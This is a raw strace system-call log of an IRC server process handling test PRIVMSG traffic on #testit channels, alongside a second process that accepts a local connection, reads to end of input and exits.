4519  12:57:07.461624 gettimeofday({1495645027, 461629}, NULL) = 0
4519  12:57:07.461639 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  12:57:07.461685 clock_gettime(CLOCK_MONOTONIC, {21837, 278698416}) = 0
4519  12:57:07.461698 gettimeofday({1495645027, 461702}, NULL) = 0
4519  12:57:07.461709 select(1024, [2 3 4 5 6 8], [], NULL, {1, 0}) = 1 (in [6], left {0, 780000})
4519  12:57:07.677581 clock_gettime(CLOCK_MONOTONIC, {21837, 494589998}) = 0
4519  12:57:07.677581 recv(6, "PRIVMSG  #testit1 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  12:57:07.677581 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677582 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677582 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677582 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677582 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677582 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677583 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677583 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677583 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677591 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677605 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677618 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677631 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677644 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677658 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677703 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677718 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677746 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677759 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677774 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677787 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677801 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.677820 gettimeofday({1495645027, 677824}, NULL) = 0
4519  12:57:07.677832 select(1024, [2 3 4 5 6 8], [], NULL, {1, 0} <unfinished ...>
19002 12:57:07.923128 <... accept resumed> {sa_family=AF_INET, sin_port=htons(33629), sin_addr=inet_addr("10.0.2.4")}, [16]) = 9
19002 12:57:07.923172 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e3278) = -1 EINVAL (Invalid argument)
19002 12:57:07.923189 _llseek(9, 0, 0xbf8e32c0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
19002 12:57:07.923201 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e3278) = -1 EINVAL (Invalid argument)
19002 12:57:07.923212 _llseek(9, 0, 0xbf8e32c0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
19002 12:57:07.923222 fcntl64(9, F_SETFD, FD_CLOEXEC) = 0
19002 12:57:07.923264 close(7)          = 0
19002 12:57:07.923380 dup(9)            = 7
19002 12:57:07.923394 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e4118) = -1 EINVAL (Invalid argument)
19002 12:57:07.923406 _llseek(7, 0, 0xbf8e4160, SEEK_CUR) = -1 ESPIPE (Illegal seek)
19002 12:57:07.923416 fstat64(7, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
19002 12:57:07.923437 dup2(7, 1)        = 1
19002 12:57:07.923456 close(7)          = 0
19002 12:57:07.923467 fcntl64(1, F_SETFD, 0) = 0
19002 12:57:07.923478 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e40e8) = -1 EINVAL (Invalid argument)
19002 12:57:07.923489 _llseek(1, 0, 0xbf8e4130, SEEK_CUR) = -1 ESPIPE (Illegal seek)
19002 12:57:07.923519 dup(9)            = 7
19002 12:57:07.923532 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e4118) = -1 EINVAL (Invalid argument)
19002 12:57:07.923543 _llseek(7, 0, 0xbf8e4160, SEEK_CUR) = -1 ESPIPE (Illegal seek)
19002 12:57:07.923553 fstat64(7, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
19002 12:57:07.923570 dup2(7, 0)        = 0
19002 12:57:07.923580 close(7)          = 0
19002 12:57:07.923590 fcntl64(0, F_SETFD, 0) = 0
19002 12:57:07.923603 fcntl64(0, F_SETFD, 0) = 0
19002 12:57:07.923618 read(0,  <unfinished ...>
4519  12:57:07.924008 <... select resumed> ) = 1 (in [5], left {0, 760000})
4519  12:57:07.924033 clock_gettime(CLOCK_MONOTONIC, {21837, 741046463}) = 0
4519  12:57:07.924048 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  12:57:07.924062 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  12:57:07.924082 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  12:57:07.924099 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  12:57:07.924136 close(5)          = 0
4519  12:57:07.924149 time(NULL)        = 1495645027
4519  12:57:07.924159 time(NULL)        = 1495645027
4519  12:57:07.924170 gettimeofday({1495645027, 924174}, NULL) = 0
4519  12:57:07.924182 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  12:57:07.924212 clock_gettime(CLOCK_MONOTONIC, {21837, 741224702}) = 0
4519  12:57:07.924222 gettimeofday({1495645027, 924226}, NULL) = 0
4519  12:57:07.924233 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [8], left {0, 910000})
4519  12:57:08.008458 clock_gettime(CLOCK_MONOTONIC, {21837, 825479930}) = 0
4519  12:57:08.008490 recv(8, "PRIVMSG  #testit2 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  12:57:08.008543 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008640 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008659 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008674 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008688 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008702 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008716 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008730 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008758 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008774 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008788 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008801 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008815 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008829 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008842 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008856 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008870 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008883 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008897 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008912 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008925 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008947 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.008964 gettimeofday({1495645028, 8968}, NULL) = 0
4519  12:57:08.008976 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [8], left {0, 720000})
4519  12:57:08.287420 clock_gettime(CLOCK_MONOTONIC, {21838, 104441128}) = 0
4519  12:57:08.287443 recv(8, "PRIVMSG  #testit2 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  12:57:08.287469 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287487 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287501 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287530 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287559 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287573 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287605 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287642 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287670 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287684 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287698 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287724 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287738 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287751 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287765 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287778 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287791 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287804 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287818 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287832 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287845 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287858 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.287874 time(NULL)        = 1495645028
4519  12:57:08.287883 time(NULL)        = 1495645028
4519  12:57:08.287900 gettimeofday({1495645028, 287904}, NULL) = 0
4519  12:57:08.287912 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  12:57:08.287941 clock_gettime(CLOCK_MONOTONIC, {21838, 104953977}) = 0
4519  12:57:08.287951 gettimeofday({1495645028, 287955}, NULL) = 0
4519  12:57:08.287962 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [6], left {0, 900000})
4519  12:57:08.387552 clock_gettime(CLOCK_MONOTONIC, {21838, 204561565}) = 0
4519  12:57:08.387553 recv(6, "PRIVMSG  #testit1 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  12:57:08.387553 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387558 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387573 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387587 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387600 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387614 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387627 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387640 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387654 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387675 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387689 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387702 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387716 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387729 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387742 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387755 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387769 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387782 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387795 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387823 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387864 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387894 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.387910 gettimeofday({1495645028, 387914}, NULL) = 0
4519  12:57:08.387922 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [4], left {0, 960000})
4519  12:57:08.427628 clock_gettime(CLOCK_MONOTONIC, {21838, 244636899}) = 0
4519  12:57:08.427628 recv(4, "PRIVMSG  #testit0 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  12:57:08.427628 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427628 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427629 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427629 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427633 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427648 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427661 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427674 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427687 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427701 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427714 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427727 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427741 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427754 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427767 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427780 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427793 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427806 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427875 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427906 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427933 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427947 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:08.427963 time(NULL)        = 1495645028
4519  12:57:08.427972 time(NULL)        = 1495645028
4519  12:57:08.427984 gettimeofday({1495645028, 427987}, NULL) = 0
4519  12:57:08.427995 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  12:57:08.428032 clock_gettime(CLOCK_MONOTONIC, {21838, 245044769}) = 0
4519  12:57:08.428042 gettimeofday({1495645028, 428046}, NULL) = 0
4519  12:57:08.428052 select(1024, [2 3 4 6 8], [], NULL, {1, 0} <unfinished ...>
19002 12:57:08.461108 <... read resumed> "", 4096) = 0
19002 12:57:08.461242 close(9)          = 0
19002 12:57:08.461432 exit_group(0)     = ?
